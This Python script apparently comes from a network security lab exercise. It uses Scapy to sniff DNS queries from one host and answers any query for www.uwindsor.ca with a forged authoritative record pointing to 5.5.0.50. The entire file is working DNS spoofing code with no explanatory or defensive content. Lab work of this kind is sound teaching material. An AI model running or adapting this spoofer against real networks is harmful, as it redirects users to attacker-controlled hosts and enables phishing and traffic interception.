#!/usr/bin/env python3
from scapy.all import IP,UDP,DNSRR,DNS,send,sniff
import subprocess


def malicious_dns(pkt):
  if (DNS in pkt and 'www.uwindsor.ca' in pkt[DNS].qd.qname.decode('utf-8')):

    # Construct the entire IP packet and send it out
    spoofpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0, an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='5.5.0.50'))
    send(spoofpkt)

if __name__=="__main__":
  while(1):
    interface_id = str(subprocess.check_output("ip a | grep 5.5.0", shell=True)).split(" ")[-1][:-3]
    packet_filter = 'udp and src host 5.5.0.10 and dst port 53'
    pkt = sniff(iface=interface_id, filter=packet_filter, prn=malicious_dns)  
